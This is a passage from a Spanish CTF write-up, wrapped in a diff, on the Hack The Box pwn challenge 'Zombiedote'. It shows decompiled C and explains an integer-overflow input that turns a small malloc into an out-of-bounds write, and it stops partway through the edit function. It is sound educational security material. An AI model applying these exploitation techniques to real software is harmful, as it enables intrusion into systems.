@@ -1,0 +1,507 @@
+<!doctype html><html lang="es"><head><title>Zombiedote | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario de 64 bits. Explotación del _heap_. Lectura y escritura OOB. _Integer Overflow_. Números en coma flotante. TLS-storage `dtor_list`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario de 64 bits. Explotación del _heap_. Lectura y escritura OOB. _Integer Overflow_. Números en coma flotante. TLS-storage `dtor_list`"><meta itemprop="keywords" content><meta itemprop="name" content="Zombiedote"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario de 64 bits. Explotación del _heap_. Lectura y escritura OOB. _Integer Overflow_. Números en coma flotante. TLS-storage `dtor_list`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Zombiedote"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario de 64 bits. Explotación del _heap_. Lectura y escritura OOB. _Integer Overflow_. Números en coma flotante. TLS-storage `dtor_list`"><meta name="twitter:description" content="Binario de 64 bits. Explotación del _heap_. Lectura y escritura OOB. _Integer Overflow_. Números en coma flotante. TLS-storage `dtor_list`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Zombiedote"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/zombiedote/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/&amp;text=Zombiedote" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/zombiedote/&amp;title=Zombiedote" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Zombiedote</h1><p class="mb4 f6 dib tracked">15 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-inserción">Función de inserción</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-edición">Función de edición</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#_chunk_-de-mmap"><em>Chunk</em> de <code>mmap</code></a></li><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li></ul></li><li><a href="#desarrollo-de-explotación">Desarrollo de explotación</a><ul><li><a href="#obteniendo-rce">Obteniendo RCE</a></li><li><a href="#cambiando-a-docker">Cambiando a Docker</a></li><li><a href="#tls-storage-dtor_list">TLS-storage <code>dtor_list</code></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>zombiedote</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Tenemos un menú típico de un reto de explotación del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./zombiedote</span>
+<span class="code-white">[ BioShield Solutions Research Institute ]</span>
+<span class="code-blue">Virus Concentration Levels Logging - Manual Mode: </span><span class="code-green">ON</span>  
+
+<span class="code-blue">[ MANUAL MODE LOGGING ]</span>
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt;</span>
+</code></pre></div><p>Si abrimos el binario en Ghidra, veremos el código fuente en C descompilado para el programa. Después de configurar nombres y tipos de variables y comprender la estructura de los <em>logs</em>, podemos definir la siguiente <code>struct</code> en Ghidra para mejorar la legibilidad:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> n_samples;</span>  
+<span class="mtk1">    </span><span class="mtk7 mtki">double</span><span class="mtk5">*</span><span class="mtk1"> samples;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> inserted;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> n_edits;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> inspected;</span>
+<span class="mtk1">} </span><span class="mtk8 mtku">log_t</span><span class="mtk1">;</span>
+</code></pre></div><p>Ahora tenemos una función <code>main</code> limpia:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">log_t</span><span class="mtk1"> log;</span>
+
+<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>
+
+<span class="mtk1">  log.n_samples </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  log.samples </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">  log.inserted </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  log.n_edits </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  log.inspected </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">menu</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (option) {</span>
+<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Invalid option."</span><span class="mtk1">);</span>  
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk9 mtki">log</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">insert</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk9 mtki">log</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">delete</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk9 mtki">log</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">inspect</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk9 mtki">log</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Tenemos varias opciones. Analicémoslas una por una. Obsérvese que hay una variable <code>log</code> que se pasa por referencia al resto de las funciones.</p><h3 id="función-de-asignación">Función de asignación</h3><p>Esta es la función <code>create</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk7 mtki">log_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">log</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">double</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_samples;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;samples </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Number of samples: "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">log-&gt;n_samples);</span>
+<span class="mtk1">    p_samples </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">double</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> log-&gt;n_samples);</span>  
+<span class="mtk1">    log-&gt;samples </span><span class="mtk5">=</span><span class="mtk1"> p_samples;</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;samples </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Failed to allocate memory for the log."</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">520</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk4">"Created a log."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"A log has already been created."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Aquí, se nos pide el número de muestras para introducir en el <code>log</code>. Entonces, el programa llama a <code>malloc</code> con el número de muestras multiplicado por <code>8</code> (esto se debe al hecho de que el atributo <code>samples</code> contiene un vector de valores <code>double</code>). Obsérvese que una vez que se asigne el registro, no podremos llamar a <code>malloc</code> otra vez.</p><p>Aquí tenemos dos cosas interesantes:</p><ul><li>Podemos asignar cualquier tamaño. Por ejemplo, podemos asignar un <em>chunk</em> enorme que no se ajuste en el espacio habitual de direcciones del <em>heap</em> y, en cambio, se asigne con <code>mmap</code>.</li><li>Podemos abusar de una vulnerabilidad de <em>Integer Overflow</em> para tener un gran número en <code>n_samples</code>. Por ejemplo, si ingresamos <code>0xe000000000000018</code>, tendremos <code>n_samples</code> con este gran valor, y luego <code>malloc</code> asignará <code>8 * 0xe000000000000018 = 0xc0</code>.</li></ul><h3 id="función-de-inserción">Función de inserción</h3><p>Esta es <code>insert</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">insert</span><span class="mtk1">(</span><span class="mtk7 mtki">log_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">log</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> n_samples;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> i;</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;samples </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"No log to insert into."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;inserted </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Number of samples tested: "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">n_samples);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;n_samples </span><span class="mtk5">&lt;</span><span class="mtk1"> n_samples) {</span>
+<span class="mtk1">      </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Invalid input."</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">520</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> n_samples; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Virus concentration level in sample #</span><span class="mtk6">%ld</span><span class="mtk4"> (</span><span class="mtk6">%%</span><span class="mtk4">): "</span><span class="mtk1">, i);</span>  
+<span class="mtk1">      </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lf</span><span class="mtk4">"</span><span class="mtk1">, log-&gt;samples[i]);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Value entered."</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk4">"Data inserted."</span><span class="mtk1">);</span>
+<span class="mtk1">    log-&gt;inserted </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Already inserted into log."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Como se puede ver, solo podemos llamar a esta función siempre que <code>log</code> esté asignado. Se nos pide que ingresemos el número de muestras (con un máximo de <code>n_samples</code>). Estas muestras deben ser valores <code>double</code>.</p><p>Si explotamos la vulnerabilidad de <em>Integer Overflow</em> de <code>create</code>, podemos lograr una primitiva de escritura casi ilimitada respecto a la dirección de <code>log->samples</code>, siendo capaces de escribir <em>out-of-bounds</em> (OOB).</p><h3 id="función-de-liberación">Función de liberación</h3><p>La función <code>delete</code> no está implementada y simplemente sale:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Operation not implemented yet. Exiting..."</span><span class="mtk1">);</span>  
+<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">520</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><h3 id="función-de-edición">Función de edición</h3><p>Esta es la función <code>edit</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk7 mtki">log_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">log</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> index;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;samples </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"No log to edit."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;n_edits </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
+<span class="mtk1">    index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Enter sample number: "</span><span class="mtk1">);</span>
